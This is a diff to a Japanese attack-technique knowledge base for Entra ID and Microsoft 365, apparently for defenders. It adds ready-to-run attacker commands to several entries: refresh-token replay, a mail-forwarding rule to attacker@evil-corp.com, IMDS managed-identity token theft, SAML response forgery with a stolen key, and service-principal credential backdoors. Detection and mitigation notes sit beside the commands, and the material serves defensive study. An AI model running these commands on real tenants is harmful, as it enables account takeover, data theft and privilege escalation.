     "events": "Entra Audit(Add member to role, Add service principal credentials, Add app role assignment to service principal, Update conditional access policy) — 対応するSign-inログ無し(黒), AuditLogs InitiatedBy=Exchange系アプリ表示の不整合, 同期環境では 4720/4728",
     "mitigate": "(1) Microsoftが2025-07-17にサーバ側で修正済み・08-06に該当API向けActorトークン発行を追加遮断済みで、顧客側パッチ適用は不要。(2) レガシーAzure AD Graph(graph.windows.net)への依存を排除し、Microsoft Graphへ移行。廃止スケジュールに沿ってブロック。(3) Global Admin数を最小化し、特権にPIM(Just-In-Time)・承認・別途強化MFAを適用(トークン悪用自体は回避するが被害拡大を抑制)。(4) AuditLogsをSentinel/XDRへ集約し「サインイン無しの特権変更」「InitiatedByのアプリ/ユーザ不整合」を継続監視。(5) 2025-07-17より前の遡及ハントを実施(当時のログは限定的である点に留意)。",
@@ -9637,6 +15755,28 @@ AD.I18N.ja.attacks = [
     "summary": "攻撃者が正規ログイン画面(主にMicrosoft 365/Entra、Google)をリバースプロキシで中継し、資格情報とMFA完了後に発行される「セッションCookie/リフレッシュトークン」を横取り・再生することでMFAを回避する中間者(AiTM)フィッシング。脆弱性ではなく手法であり、Evilginx(OSS)やTycoon2FA/EvilProxy等のPhaaSが2024-2026年に急増(Tycoon2FAは2023年8月に登場し、2025年はAiTM系PhaaS市場の大半を占有、2026年3月にEuropol主導で技術的テイクダウン)。",
     "how": "前提=標的のUPNとフィッシング配送手段のみ(特権不要)。攻撃者はEvilginxのphishletやTycoon2FA/EvilProxyのPhaaSでプロキシ用ドメインを立て、被害者にリンクを送付。被害者はプロキシ上の偽ログイン画面に資格情報を入力→プロキシがリアルタイムでMicrosoft/Googleの正規エンドポイントへ中継し、MFAプロンプトも往復させる(Tycoon2FAの最新版はWebSocketで双方向中継しBot/解析回避を強化)。認証成功時にIdPが発行するESTSAUTH等のセッションCookieとリフレッシュトークンをプロキシが捕捉し攻撃者へ渡す。攻撃者は盗んだトークンを自分の環境から再生(T1550.004)し、パスワード変更後も有効なセッションでメール閲覧・MFA手段の追加登録・受信箱転送ルール作成・OAuth同意付与といった永続化/BECへ移行する。パッチ対象の脆弱性は無く、フィッシング耐性MFAとトークン保護で緩和する。",
     "tools": "Evilginx, Tycoon2FA, EvilProxy, Mamba2FA, NakedPages, Muraena, Modlishka, EvilnoVNC",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "AiTMで盗んだRTをトークンエンドポイントへ再生しセッションを乗っ取る。同一sessionIdが別IP/UAで現れる点がSigninLogs上唯一の手掛かり",
+        "q": "Invoke-RestMethod -Uri 'https://login.microsoftonline.com/common/oauth2/v2.0/token' -Method Post -Body @{grant_type='refresh_token';client_id='<stolen-app-client-id>';refresh_token=$stolenRT}"
+      },
+      {
+        "tool": "Exchange Online",
+        "t": "AiTM成功後の典型的なBEC永続化。`-ForwardTo`と`-DeleteMessage`の組み合わせはUnifiedAuditLogのNew-InboxRuleで高確度シグナル",
+        "q": "New-InboxRule -Name \"Update\" -SubjectContainsWords \"invoice\",\"wire\" -ForwardTo attacker@evil-corp.com -DeleteMessage $true"
+      },
+      {
+        "tool": "Graph API",
+        "t": "乗っ取ったセッションでメール認証方式を追加登録し永続化。パスワード変更だけでは排除できないバックドアになる",
+        "q": "New-MgUserAuthenticationEmailMethod -UserId <victim-user-id> -EmailAddress attacker@evil-corp.com"
+      },
+      {
+        "tool": "Graph API",
+        "t": "悪性アプリへのOAuth同意を代行付与しトークン失効後も継続アクセス。illicit consent grantの典型手口",
+        "q": "New-MgOauth2PermissionGrant -ClientId <malicious-app-sp-id> -ConsentType AllPrincipals -ResourceId <msgraph-sp-id> -Scope 'Mail.Read Files.ReadWrite.All'"
+      }
+    ],
     "detect": "クラウドの認証テレメトリが主軸。Entraサインインログ(EntraIdSignInEvents/SigninLogs)で、同一ユーザが成功直後に別IP/別国から短時間で認証(不可能な移動)、見慣れないユーザエージェント・ClientApp、AiTMプロキシASN/新規登録ドメイン、RiskLevelDuringSignIn=high、非対話サインインでのトークン再生を検出。Entra ID Protectionのリスク検知(異常トークン/見慣れないサインインプロパティ)とDefender XDRのAttack disruption(AiTM自動遮断)。侵害後の兆候はEntra AuditLogsでMFA手段の追加登録・OAuth同意を、CloudAppEvents/Exchange(OfficeActivity)で受信箱転送ルール(New-InboxRule/Set-Mailbox)や大量MailItemsAccessedを検出。エンドポイントEDRは通常この手法を捕捉しない(被害者はブラウザ操作のみ)。",
     "events": "Entra SigninLogs/EntraIdSignInEvents(異常IP・国からのトークン再生, RiskLevel=high), Entra AuditLogs(User registered security info / Consent to application / Update user), CloudAppEvents+Exchange/OfficeActivity(New-InboxRule, Set-Mailbox ForwardingSMTP, MailItemsAccessed)",
     "mitigate": "最重要はフィッシング耐性MFA=FIDO2/WebAuthnセキュリティキーまたはパスキー、証明書ベース認証、Windows Hello for Business(プロキシで中継不可)。条件付きアクセスでトークン保護(トークン・バインディング)と準拠/ハイブリッド参加デバイス必須化、レガシー認証ブロック、名前付き場所/信頼ネットワーク、サインインリスクベースCAでhigh時にブロックまたは再認証。Continuous Access Evaluation(CAE)を有効化しトークン失効を近リアルタイム反映。Defender XDRのAutomatic attack disruptionでAiTMユーザを自動無効化。侵害時はセッション取り消し(Revoke sessions/StsRefreshTokenValidFrom更新)、パスワードリセット、不正MFA手段・OAuth同意・受信箱ルールの除去。ユーザ教育とURL/ブランドの検証。",
@@ -9682,6 +15822,28 @@ AD.I18N.ja.attacks = [
     "summary": "Azure VM/App Service/コンテナ上のコード実行やSSRFから、リンクローカルのIMDS(169.254.169.254)へ`Metadata:true`付きでリクエストし、アタッチされたマネージドID(MSI)のARM/Graph/Key VaultアクセストークンをSSRF/RCEで窃取・悪用してクラウド権限昇格・横展開する手法。技術自体に固有CVEは無いが、CVE-2025-53767(Azure OpenAI SSRF, CVSS10, 2025年8月)やCVE-2025-62207(Azure Monitor SSRF, 2025年11月)などSSRF→IMDS到達を生む脆弱性が2025年に複数公表されている。MITRE T1552.005(Cloud Instance Metadata API)に対応。",
     "how": "前提: 対象VM/リソースにシステム割当/ユーザー割当マネージドIDがアタッチされ、そのIDが過剰なRBAC(Contributor/Key Vault Secrets User等)を持つこと。攻撃者はVM上でのコード実行(RCE/webshell)か、ヘッダ注入可能なSSRFのいずれかを取得する。プリミティブはIMDSトークン取得: `curl -H \"Metadata:true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"`(resourceをhttps://vault.azure.net や https://graph.microsoft.com に差し替えKey Vault/Graphトークンも取得)。IMDSはMetadataヘッダ必須・X-Forwarded-Forを含む要求を拒否するため単純SSRFは弾かれるが、ヘッダ制御可能なSSRFは成立。取得したJWTでaz cli(az login --identity / az account get-access-token)やREST APIを叩き、Key Vaultシークレット吸い出し、ARMでロール割当追加(Microsoft.Authorization/roleAssignments/write)やSP資格情報追加による永続化・Global Admin相当まで昇格。影響: マネージドID機能自体は仕様であり恒久パッチは無く、SSRF側の各CVE(2025-53767/62207等)はMicrosoftが個別に修正済み。",
     "tools": "curl/Invoke-WebRequest, Azure CLI (az account get-access-token, az login --identity), Azure PowerShell, MicroBurst (Get-AzurePasswords), ROADtools/roadtx, TokenTactics, Pacu (Azure), PowerZure",
+    "cmd": [
+      {
+        "tool": "curl",
+        "t": "リンクローカルIMDSに`Metadata:true`ヘッダのみでマネージドIDのARMトークンを要求。SSRF/RCEから一撃でクラウド昇格する",
+        "q": "curl -H \"Metadata:true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\""
+      },
+      {
+        "tool": "PowerShell",
+        "t": "PowerShell版。resourceをvault.azure.net等に差し替えればKey Vault/Graphトークンも同じ経路で取得できる",
+        "q": "Invoke-RestMethod -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -Headers @{Metadata='true'} -UseBasicParsing"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "取得済みマネージドIDでaz cliごとログイン。以降のaz操作はVM上のマネージドID権限で正規運用と区別しづらい",
+        "q": "az login --identity && az account get-access-token --resource https://vault.azure.net"
+      },
+      {
+        "tool": "MicroBurst",
+        "t": "IMDSトークンを使いKey Vault/Automation/App Serviceのシークレットを一括収集する定番の後処理",
+        "q": "Get-AzPasswords -Verbose"
+      }
+    ],
     "detect": "エンドポイント(MDE/Falcon): Azure Guestエージェント以外のプロセス(powershell/pwsh/python/curl/w3wp/node/cmd)から169.254.169.254へのアウトバウンド接続、コマンドラインに`identity/oauth2/token`・`Metadata:true`・`get-access-token`を含む実行。クラウドID(Entra): マネージドIDサインイン(AADManagedIdentitySignInLogs)は元来UserAgent無し・IP空欄と情報が乏しいため、ResourceDisplayNameのベースライン逸脱や普段と異なるリソースアクセスを検知。ダウンストリームはKey Vault診断ログ(AuditEvent: SecretGet)でMSIによるsecrets読取急増、Azure ActivityでroleAssignments/write、Entra監査ログでSP資格情報追加を相関。トークンが非Azure IP(オンプレ/攻撃者環境)から使われるとワークロードID条件付きアクセスやCloudAppEventsで露見。",
     "events": "Entra Managed Identity Sign-in(AADManagedIdentitySignInLogs), Key Vault診断ログ(AuditEvent: SecretGet / vaults secrets read), Azure Activity(Microsoft.Authorization/roleAssignments/write), Entra Audit(Add app role assignment to service principal / Add service principal credentials), DeviceNetworkEvents(169.254.169.254), 4688(curl/pwsh/az)",
     "mitigate": "(1)マネージドIDのRBACを最小権限化しサブスクリプション/リソースグループのOwner・Contributor付与を避け、Key VaultはRBAC+ファイアウォールで限定。(2)ワークロードID向け条件付きアクセス(Entra Workload ID Premium)でSP/MSIサインインを許可IP/場所に制限し、窃取トークンの非Azure IPからの利用をブロック。(3)SSRF対策: アプリを各CVE(CVE-2025-53767/62207等)まで最新化、WAF導入、IMDSがMetadataヘッダ必須・X-Forwarded-For拒否である点を維持、コンテナ/Podでは169.254.169.254へのアプリユーザーアクセスをiptables等で遮断しAzure AD Workload Identityへ移行。(4)Defender for Cloudを全サブスクリプションで有効化しIMDS/トークン悪用アラートを取得、継続的アクセス評価(CAE)を有効化。",
@@ -9727,6 +15889,23 @@ AD.I18N.ja.attacks = [
     "summary": "nOAuthは、SaaSアプリがEntra IDのID/アクセストークン内の「可変かつ未検証のemailクレーム」をユーザーの一意識別子（アカウント紐付けキー）として誤用している実装アンチパターンを悪用し、攻撃者が自分の無料Entraテナントとターゲットのメールアドレスだけで、パスワードやMFA・被害者操作なしにクロステナントで完全アカウント乗っ取りを行える手法。単一CVEではなくアプリ側の設計不備で、2023年6月にDescopeが公開後もSemperisの2025年調査で約9%（テスト104アプリ中9件、推定15,000超のSaaS）が依然として脆弱。",
     "how": "前提: 攻撃者が自前の無料Entra IDテナントを1つ作成する権限（クレジットカード等の障壁なし）と、被害者のメールアドレスのみ。被害者テナントへの侵入・被害者操作・パスワード/MFAは不要。手順: (1)攻撃者テナントでユーザーを作成し、Azureポータルまたは Microsoft Graph の PATCH /users で連絡先情報の mail（未検証・可変属性）を被害者のメールアドレスに設定する。userPrincipalNameと異なり mail は未検証ドメインの値でも設定可能。(2)脆弱なSaaSアプリの「Microsoftでサインイン」(OIDC/OAuth2)を攻撃者ユーザーで実行する。(3)対象アプリがremoveUnverifiedEmailClaimを無効（false）にしているため、Entraが発行するIDトークン/UserInfoに攻撃者が制御する email クレーム（=被害者メール）が含まれる。(4)アプリが一意識別子として不変の sub や oid+tid（または iss+sub）ではなく email クレームでアカウントを検索・自動紐付けするため、既存の被害者アカウントに攻撃者セッションがマージされ完全乗っ取りに至る。鍵となるプリミティブ: 未検証emailクレームの偽装によるアカウント・リンク衝突。影響範囲/パッチ状況: MicrosoftはトークンサービスにauthenticationBehaviors.removeUnverifiedEmailClaim（Graph beta）を導入し、既定では大半のアプリで未検証ドメインのemailクレームを削除する。ただしシングルテナントアプリ、および未検証emailでの過去サインイン実績があるマルチテナントアプリは既定の例外であり、当該フラグをtrueに明示設定しない限り依然emailを発行し脆弱。根本修正はアプリ開発側の識別子変更が必須で、MSRC案件93209は2025年4月18日にクローズ（中央集権的な完全修正なし）。SemperisはM365への横展開の可能性も示唆。",
     "tools": "Azureポータル（連絡先情報のmail編集）, Microsoft Graph / Graph PowerShell（PATCH /users, applications authenticationBehaviors）, 標準OAuth2/OIDC「Microsoftでサインイン」フロー, Descope nOAuthチェッカー, Semperis nOAuth検査ツール, Burp Suite（トークン/クレーム観察）",
+    "cmd": [
+      {
+        "tool": "Graph API",
+        "t": "攻撃者テナントの自ユーザー作成時に未検証mail属性へ被害者アドレスを設定。被害者側の操作・MFAは一切不要",
+        "q": "New-MgUser -DisplayName 'Test User' -UserPrincipalName 'attacker@attackertenant.onmicrosoft.com' -MailNickname attacker -Mail 'victim@targetorg.com' -PasswordProfile @{Password='Passw0rd!'} -AccountEnabled"
+      },
+      {
+        "tool": "Graph API",
+        "t": "既存アカウントのmail属性のみ事後変更する版。AuditLogsのUpdate userでtargetPropertyがMailの操作として残る",
+        "q": "Update-MgUser -UserId <attacker-user-id> -Mail 'victim@targetorg.com'"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "PowerShellモジュール無しでmail属性を直接PATCH。ポータルGUI操作でも同じUpdate userイベントが残る",
+        "q": "az rest --method patch --url \"https://graph.microsoft.com/v1.0/users/<attacker-user-id>\" --body '{\"mail\":\"victim@targetorg.com\"}'"
+      }
+    ],
     "detect": "これはクラウド/Entra側の認証ロジック悪用でエンドポイント痕跡はほぼ残らないため、検知はアイデンティティ/クラウド監査ログが中核。主なシグナル: (1)同一メールアドレス（AccountUpn/email）が複数の異なる AccountObjectId（ディレクトリオブジェクト）に紐づくEntraサインイン=攻撃者IDと被害者IDのメール衝突。(2)脆弱なSaaSエンタープライズアプリへの「Microsoftでサインイン」が、被害者の通常テナントとは異なる外部ホームテナント/未知IP/国から発生。(3)未検証ドメインのメールを持つ外部ゲスト/新規オブジェクトによる当該アプリへの初回サインイン。(4)自テナント内の悪意ある内部者の場合、Entra監査ログ「Update user」で mail/otherMail が外部ドメインに変更される。テレメトリ源: Entraサインインログ（SigninLogs/EntraIdSignInEvents）, Defender for Cloud Apps（CloudAppEvents）, Entraディレクトリ監査（AuditLogs）。エンドポイントEDR（MDE/CrowdStrike）はトークン発行を観測できないため主役ではない。なおEntraサインインログには sub クレームが記録されないため、SaaS側認証ログとメール/UPNで相関する必要がある点が検知を難しくする。",
     "events": "Entra SigninLogs / EntraIdSignInEvents (sign-in to SaaS enterprise app via 'Sign in with Microsoft' OIDC), CloudAppEvents (LogOn / app access to the SaaS app), Entra AuditLogs (Update user - mail/otherMail change, in attacker/insider tenant). ※Windows Event IDは発火しない（クラウド認証のためオンプレSecurityEventは無関係）。",
     "mitigate": "(1)アプリ開発側の恒久対策が本質: ユーザーの一意識別子として可変・未検証の email クレームを廃し、不変の sub、または oid+tid（テナントID+オブジェクトID）を用いる。アカウント自動マージ時は初回に必ずメール所有確認（マジックリンク等）を挟む。(2)Microsoft Graph（beta）で対象アプリの authenticationBehaviors.removeUnverifiedEmailClaim を true に設定し、未検証ドメインの email クレームを削除する。既定でも大半のアプリは削除されるが、シングルテナントアプリおよび未検証emailでの過去サインイン実績があるマルチテナントアプリは既定の例外のため、これらは明示的に true 設定が必要。(3)可能なら email をオプションクレームから外し、xms_edov（ドメイン所有者検証済みか示すクレーム）を利用する。(4)条件付きアクセスで既知テナント/デバイス/場所を強制し、外部ホームテナントからの当該SaaSアクセスを制限（ただしクロステナントOIDCには限界あり）。(5)Semperis/Descopeのチェッカーで自組織利用SaaSの脆弱性を棚卸しし、脆弱ベンダーへ修正を要請。(6)重要SaaSへのサインインログを継続監視。",
@@ -9772,6 +15951,28 @@ AD.I18N.ja.attacks = [
     "summary": "Silver SAMLは、Entra IDのSAMLアプリで外部生成されたトークン署名証明書（PFX秘密鍵）を窃取した攻撃者が、Semperis製SilverSAMLForgerで任意ユーザーのSAML応答を偽造し、Salesforceなどの下流SPへ正規Entra認証を経ずに成りすましログインする手法。Entra ID自身の自己署名証明書（秘密鍵はエクスポート不可）のみを使えば回避でき、製品バグではなく設定・鍵管理の問題（CVEなし。Microsoftは「即時対応の基準を満たさない」と回答）。",
     "how": "前提：標的SAMLアプリが「外部生成」トークン署名証明書（自己署名/社内PKI/外部CA）を使い、その秘密鍵PFXが窃取可能なこと（IISやクライアント証明書ストアからのエクスポート・Teams/Slack経由の受け渡し・Azure Key Vault侵害等）。攻撃者はEntra管理センターまたはMicrosoft Graphから対象ユーザーのUPN/objectID/属性（surname・displayName等）など必要クレームを収集し、標的アプリのRecipient/Audience（EntityID・ACS URL）をSSO設定から確認。SilverSAMLForger（Semperis製PoC）に窃取した証明書/秘密鍵とクレームを渡すと、Entra IDが返すものと同一構造の署名済みSAML Responseを偽造できる。SP-initiatedフローではBurp Suiteで応答を差し替え、IdP-initiatedフローではSPのACSへ直接POSTして任意ユーザーとしてアクセス。偽造署名の検証はSP側で通るため、Entra側の認証・条件付きアクセス・MFAを完全に迂回する。製品脆弱性ではなく、Entra IDが外部インポート証明書での署名を許容する仕様に依存。Entra自己署名証明書は秘密鍵がエクスポート不可のため対象外。",
     "tools": "SilverSAMLForger (Semperis PoC), Burp Suite, Microsoft Graph / Entra管理センター(クレーム収集), PowerShell/OpenSSL(PFX秘密鍵抽出)",
+    "cmd": [
+      {
+        "tool": "OpenSSL",
+        "t": "窃取したPFXから署名用秘密鍵を抽出。SAML応答偽造の前段で、端末上のPFXアクセスがファイル痕跡として残る",
+        "q": "openssl pkcs12 -in stolen-cert.pfx -nocerts -nodes -out key.pem"
+      },
+      {
+        "tool": "Graph API",
+        "t": "偽造SAML応答に載せるUPN/objectId/surname等のクレームを収集する下見",
+        "q": "Get-MgUser -UserId admin@corp.onmicrosoft.com -Property DisplayName,Surname,Id,UserPrincipalName"
+      },
+      {
+        "tool": "SilverSAMLForger",
+        "t": "窃取鍵とクレームからEntra発行と同一構造の署名済みSAML応答を偽造。Entra側のMFA/CAを完全に迂回しSP側だけで認証が成立する",
+        "q": "SilverSAMLForger.exe generate --pfxPath stolen-cert.pfx --pfxPassword 'Passw0rd!' --idpid https://sts.windows.net/<tenantId>/ --recipient https://victim-sp.example.com/sso/saml2 --subjectnameid admin@corp.onmicrosoft.com --audience https://victim-sp.example.com/saml2/sp"
+      },
+      {
+        "tool": "SilverSAMLForger",
+        "t": "クレームをJSON設定から読み込む一括生成版。複数SP/複数ユーザー分の偽造応答を素早く量産できる",
+        "q": "SilverSAMLForger.exe generateJSON --jsonFile claims.json"
+      }
+    ],
     "detect": "偽造そのものはEntra外で行われEntraサインインログに現れないため、二段構えで検知する。(1)準備段階：Entra監査ログ(ApplicationManagementカテゴリ)でサービスプリンシパルのトークン署名証明書変更＝「Update application – Certificates and secrets management」「Add service principal credentials」、PreferredTokenSigningKeyThumbprintの変更、外部生成証明書のインポートを監視。証明書のCNが\"CN=Microsoft Azure Federated SSO Certificate\"でなければ外部証明書の疑い。(2)悪用段階：標的SP側ログ（Salesforceログイン履歴等）で成功ログインが記録されるのに、対応するEntraサインインログ（EntraIdSignInEvents/SigninLogs）が存在しない＝IdPを経ないアクセスの強い兆候。加えてPFX/秘密鍵のエクスポート・持ち出し（証明書ストアアクセス、certutil/OpenSSL実行）をエンドポイントで監視。テレメトリ：Entra監査ログ、Entra/SPサインインログ、SP監査ログ、EDRプロセス/ファイル。",
     "events": "Entra Audit(Update application – Certificates and secrets management), Entra Audit(Add service principal credentials / PreferredTokenSigningKeyThumbprint 変更) [ApplicationManagement], AuditLogs OperationName='Update application', SP側ログイン履歴にEntra SigninLogs対応なし(相関欠落), EDR: DeviceProcessEvents PFX/秘密鍵エクスポート(certutil/OpenSSL/Export-PfxCertificate)",
     "mitigate": "最重要：SAML署名にはEntra ID自己署名証明書のみを使用し（秘密鍵はエクスポート不可のため窃取不能）、外部生成証明書のインポートを禁止・棚卸しして排除する。アプリ所有者/Application・Global Administratorを最小化し、サービスプリンシパルへの資格情報追加を制限。Entra監査ログでトークン署名証明書の変更を変更管理と突合しアラート化。可能なアプリはSAMLからOpenID Connect(OIDC)へ移行。SP側ではSP-initiatedフローを優先し、InResponseToの相関検証と応答有効期間の厳格化を実施。秘密鍵はKey Vault等で保護しIISやチャット経由の持ち出しを禁止。CVEは無く、恒久対策はパッチではなく自己署名証明書の徹底と鍵管理。",
@@ -9817,6 +16018,28 @@ AD.I18N.ja.attacks = [
     "summary": "Global 管理者または特権ロール管理者が、メンバー管理制限付き管理単位(Restricted Management AU)に攻撃者のバックドア アカウントを収容してテナント全体の管理者による無効化・削除・パスワード/MFA変更を不能にし、さらに HiddenMembership AU + スコープ付きロール割り当てで特権を秘匿する「設計上の仕様を悪用した」永続化手法。CVEではないが、Datadog が発見した Graph API のタイミングバグ(不変ユーザー生成)は MSRC で中程度と評価され2025年2月22日に修正済み。",
     "how": "前提: Global Administrator または Privileged Role Administrator(AU作成とスコープ付きロール割り当てが可能な特権)を既に保有。手順: (1) `az rest --method post --url .../v1.0/directory/administrativeUnits --body '{\"displayName\":\"...\",\"isMemberManagementRestricted\":true}'` で制限付き管理AUを作成、(2) 攻撃者アカウントをメンバー追加(この時点でテナント管理者は当該アカウントを変更・削除・無効化・MFAリセット不能に)、(3) 追加で `visibility:\"HiddenMembership\"` のAUを作り、Privileged Authentication Administrator 等のロールをそのAUスコープで攻撃者アカウントに割り当て、標的管理者/役員のパスワード・MFAを秘匿的に操作可能にする。ツールは Microsoft Graph API、Azure CLI(`az rest`)、Microsoft.Graph PowerShell、Stratus Red Team。中核プリミティブは AU の管理制限フラグと HiddenMembership による可視性制御。これらは脆弱性ではなく仕様。関連バグ(AU作成→追加→削除→AU削除の競合で不変ユーザーを生成)は 2025-02-22 に修正済み。復旧は GA/PRA が悪性AUを削除し(約5分の伝播遅延あり)アカウントを削除する。",
     "tools": "Microsoft Graph API, Azure CLI (az rest), Microsoft.Graph PowerShell, Stratus Red Team, AzureHound/ROADtools(偵察)",
+    "cmd": [
+      {
+        "tool": "Graph API",
+        "t": "メンバー管理制限フラグ付きAUを作成。`IsMemberManagementRestricted`はimmutableで後から解除できない",
+        "q": "New-MgDirectoryAdministrativeUnit -DisplayName \"IT-Restricted\" -IsMemberManagementRestricted"
+      },
+      {
+        "tool": "Graph API",
+        "t": "攻撃者アカウントを制限付きAUへ収容。この時点でGA含む通常管理者操作(無効化/削除/MFAリセット)が効かなくなる",
+        "q": "New-MgDirectoryAdministrativeUnitMemberByRef -AdministrativeUnitId <au-id> -OdataId \"https://graph.microsoft.com/v1.0/users/<attacker-user-id>\""
+      },
+      {
+        "tool": "Az CLI",
+        "t": "PowerShellモジュール無しの直接POST版。isMemberManagementRestricted:trueの新規AU作成はテナントでは稀な操作",
+        "q": "az rest --method post --url \"https://graph.microsoft.com/v1.0/directory/administrativeUnits\" --body '{\"displayName\":\"IT-Restricted\",\"isMemberManagementRestricted\":true}'"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "メンバー一覧を非表示にするHiddenMembership AUを追加作成。スコープ付きロール付与と組み合わせ特権を秘匿する",
+        "q": "az rest --method post --url \"https://graph.microsoft.com/v1.0/directory/administrativeUnits\" --body '{\"displayName\":\"Hidden-Ops\",\"visibility\":\"HiddenMembership\"}'"
+      }
+    ],
     "detect": "テレメトリは Entra ディレクトリ監査ログ(AuditLogs / CloudAppEvents 経由の Core Directory)が主。検知シグナル: (1) isMemberManagementRestricted=true の管理単位新規作成(Add administrative unit)、(2) 制限付き管理AUへのメンバー追加(Add member to restricted management administrative unit)、(3) AUスコープでの特権ロール(Privileged Authentication Administrator, User Administrator 等)のスコープ付き割り当て(Add scoped member to role)、(4) HiddenMembership 可視性のAU作成。これらが短時間に連続し、かつ新規/低頻度アカウントが対象・実行者の場合に高信頼。サインインテレメトリ(EntraIdSignInEvents/SigninLogs)で当該操作を行った特権プリンシパルの発信元IP・非典型クライアントを相関。エンドポイント側では az.exe/pwsh から administrativeUnits を含む Graph 呼び出しを補足可能。",
     "events": "Entra Audit(Add administrative unit / Add member to restricted management administrative unit / Add scoped member to role), CloudAppEvents, EntraIdSignInEvents",
     "mitigate": "(1) Global Administrator / Privileged Role Administrator の保有者を最小化し PIM で Just-in-Time 昇格+承認を必須化。特権ロール割り当てに MFA/フィッシング耐性認証を要求する条件付きアクセスを適用。(2) 管理単位およびスコープ付きロール割り当ての作成を監査し、isMemberManagementRestricted や HiddenMembership の新規作成をアラート化。(3) Datadog が報告した競合バグ(不変ユーザー)は Microsoft が 2025-02-22 に修正済み — 追加パッチ不要だがテナントが最新であることを確認。(4) RMAU は本来 CA バイパス防止など正当用途があるため全面禁止ではなく、作成者と対象を許可リストで統制し定期レビュー。(5) インシデント時は GA/PRA が悪性AUを削除(約5分待機)後にアカウントを無効化・削除。",
@@ -9857,6 +16080,23 @@ AD.I18N.ja.attacks = [
     "summary": "UnOAuthorized は、Application Administrator / Cloud Application Administrator ロール（または Application.ReadWrite.All 等）を持つ攻撃者が、Microsoft のファーストパーティ サービスプリンシパル（Device Registration Service 等）に資格情報を追加して当該アプリになりすまし、隠れた特権で自分を Global Administrator に昇格させる Entra ID の特権昇格手法。CVE なし。Microsoft がサーバ側で修正：中核 SP（Device Registration Service / Viva Engage / Rights Management）は 2024年に段階的に資格情報認証を無効化（2024年8月7日公開）、Office 365 Exchange Online 経由の派生（Datadog I SPy）は 2025年8月7日にブロックされた（いずれも顧客側パッチ不要）。",
     "how": "前提: 侵害アカウントが Application Administrator または Cloud Application Administrator ロール（あるいは Application.ReadWrite.All / Application.ReadWrite.OwnedBy アプリ権限）を保持。これらのロールは任意のサービスプリンシパルにパスワード/証明書資格情報を追加できる点が核となるプリミティブ。手順: (1) Microsoft ファーストパーティ SP に資格情報を追加。代表は Device Registration Service (AppId 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9)。Graph PowerShell の Add-MgServicePrincipalPassword / Update-MgServicePrincipal、az ad sp credential reset、または POST /servicePrincipals/{id}/addPassword を使用。(2) client credentials grant フローでその AppId として Graph トークンを取得しなりすまし。(3) Device Registration Service は可視スコープが空でも隠れた権限で特権ロールのメンバーを追加/削除でき、Graph で自分を Global Administrator ロールに追加。Viva Engage SP はユーザー（GA 含む）の削除/完全削除、Microsoft Rights Management Service SP はユーザー作成が可能だった。関連手法(Datadog I SPy)では Office 365 Exchange Online SP (00000002-0000-0ff1-ce00-000000000000) が Domain.ReadWrite.All を持ち、federated ドメイン バックドア＋SAML トークン偽造（federatedIdpMfaBehavior による MFA バイパス）に悪用可能。影響/パッチ: CVE なし。中核 UnOAuthorized（Device Registration Service 等）は MSRC 報告 2024年1月11日、Microsoft が2024年を通じて対象 SP の資格情報認証をサーバ側で段階的に無効化し（Device Registration Service は Graph エラーを返す）、2024年8月7日公開。Datadog I SPy 派生（Exchange Online SP）は MSRC 報告 2025年1月14日、2025年8月7日に同 SP の Graph トークン取得がブロックされた。顧客側パッチは不要だが、過去に付与された残存資格情報の除去が必要。",
     "tools": "Microsoft Graph PowerShell (Add-MgServicePrincipalPassword, Update-MgServicePrincipal), Azure CLI (az ad sp credential reset), Microsoft Graph REST (addPassword), AADInternals, ROADtools, Semperis Purple Knight / Directory Services Protector（検知側）",
+    "cmd": [
+      {
+        "tool": "Graph API",
+        "t": "Device Registration Service等の第一者SPにパスワード資格情報を追加しなりすまし基盤を作る。addPasswordはAuditLogsに残るが対象がファーストパーティSPだと見落とされやすい",
+        "q": "Add-MgServicePrincipalPassword -ServicePrincipalId 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 -PasswordCredential @{DisplayName='update'}"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "Azure CLI版の資格情報追加。`--append`は既存資格情報を残したまま追加するためオーナー側は気づきにくい",
+        "q": "az ad sp credential reset --id 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 --append"
+      },
+      {
+        "tool": "Graph API",
+        "t": "PowerShellモジュールを介さない生のGraph呼び出し。このAppIdのclient credentialsを得れば隠れた特権でGA自己昇格できる",
+        "q": "Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/servicePrincipals/01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/addPassword' -Body @{passwordCredential=@{displayName='update'}}"
+      }
+    ],
     "detect": "主テレメトリは Entra ID ディレクトリ監査ログ (AuditLogs) とサインインログ。検知信号: (1) OperationName「Add service principal credentials」で TargetResources が Microsoft ファーストパーティ SP（特に Device Registration Service / Office 365 Exchange Online / Viva Engage）＝顧客が第一者 SP に資格情報を付与することは正常運用では起きない強い異常。(2) 特権ロール変更「Add member to role」で InitiatedBy.app.displayName がファーストパーティ アプリ（例 Device Registration Service）＝アプリが GA を付与する挙動は不正。(3) サービスプリンシパル サインイン（client credentials）が新規/異常な IP から。エンドポイント側では管理者ホストで Connect-MgGraph → Update-MgServicePrincipal / az ad sp credential reset の実行を DeviceProcessEvents で捕捉可能。クラウド監査（Entra AuditLogs/SigninLogs/CloudAppEvents）が主、ホスト EDR は補助。",
     "events": "Entra Audit(Add service principal credentials → 対象 first-party SP 例 Device Registration Service), Entra Audit(Add member to role → InitiatedBy=app), Entra Audit(Update application – Certificates and secrets management), SigninLogs/ServicePrincipal client-credentials sign-in, CloudAppEvents",
